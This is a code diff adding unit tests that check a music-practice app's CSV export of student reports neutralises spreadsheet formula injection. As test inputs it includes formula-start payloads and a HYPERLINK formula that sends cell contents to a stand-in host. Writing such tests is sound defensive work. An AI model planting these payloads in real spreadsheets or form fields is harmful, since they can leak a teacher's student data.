@@ -212,3 +212,71 @@ describe("reportsToCsv", () => {
         expect(rows[1]?.split(",")).toHaveLength(6);
     });
 });
+
+describe("the sheet a teacher opens runs nothing a student wrote", () => {
+    const title = (id: string) => ({ twinkle: "Twinkle", "ode-to-joy": "Ode" })[id] ?? id;
+
+    // Every character a spreadsheet reads as the start of a formula. A report is
+    // written by the device it describes and is explicitly not proof, so all of this
+    // is attacker-chosen text arriving on the teacher's machine.
+    const FORMULA_STARTS = ["=", "+", "-", "@", "\t", "\r"];
+
+    // A hostile name arrives over the wire, not from buildReport — that trims, so a
+    // leading tab or return can only reach the sheet through a crafted code.
+    const received = (who: string): AssignmentReport =>
+        decodeReport(
+            encodeReport({
+                assignmentId: "wk1",
+                assignmentName: "W",
+                who,
+                items: [{ id: "twinkle", score: 90 }],
+                at: 1,
+            }),
+        )!;
+
+    it.each(FORMULA_STARTS)("disarms a name beginning with %j", (lead) => {
+        const nameCell = reportsToCsv([received(`${lead}1+1`)], title).split("\n")[1]!;
+        // Quoted, and the first character inside the quotes is the text marker — so the
+        // cell is read rather than evaluated.
+        expect(nameCell.startsWith(`"'${lead}`)).toBe(true);
+    });
+
+    it("carries a leading tab through the wire that buildReport would have trimmed", () => {
+        expect(received("\t=1+1").who).toBe("\t=1+1");
+        expect(buildReport(assignment, scores({}), "\t=1+1", 1).who).toBe("=1+1");
+    });
+
+    it("disarms the classic exfiltration payload", () => {
+        const who = '=HYPERLINK("http://x.test?"&A1&B1,"Grades")';
+        const row = reportsToCsv([received(who)], title).split("\n")[1]!;
+        expect(row.startsWith(`"'=HYPERLINK`)).toBe(true);
+        // The payload survives as readable text; it just isn't run.
+        expect(row).toContain("HYPERLINK");
+    });
+
+    it("disarms a crafted piece id in the header row", () => {
+        // An id that resolves to no title falls back to the id itself, so the header is
+        // reachable from the wire just as the name column is.
+        const crafted = makeAssignment({ id: "wk1", name: "W", items: [{ id: "=1+1" }] });
+        const reports = [buildReport(crafted, scores({}), "Ada", 1)];
+        const header = reportsToCsv(reports, title).split("\n")[0]!;
+        expect(header).toBe(`Name,Played,Average,"'=1+1"`);
+    });
+
+    it("leaves an ordinary name exactly as it was", () => {
+        const reports = [
+            buildReport(assignment, scores({ twinkle: 90, "ode-to-joy": 70 }), "Ada", 1),
+        ];
+        expect(reportsToCsv(reports, title).split("\n")[1]).toBe("Ada,2/3,80,90,70,");
+    });
+
+    it("still escapes a name that would split the row", () => {
+        const reports = [buildReport(assignment, scores({}), 'Lovelace, Ada "A"', 1)];
+        expect(reportsToCsv(reports, title)).toContain('"Lovelace, Ada ""A"""');
+    });
+
+    it("guards a name that both starts a formula and carries a comma", () => {
+        const reports = [buildReport(assignment, scores({}), '=1,"2"', 1)];
+        expect(reportsToCsv(reports, title).split("\n")[1]!).toBe(`"'=1,""2""",0/3,0,,,`);
+    });
+});
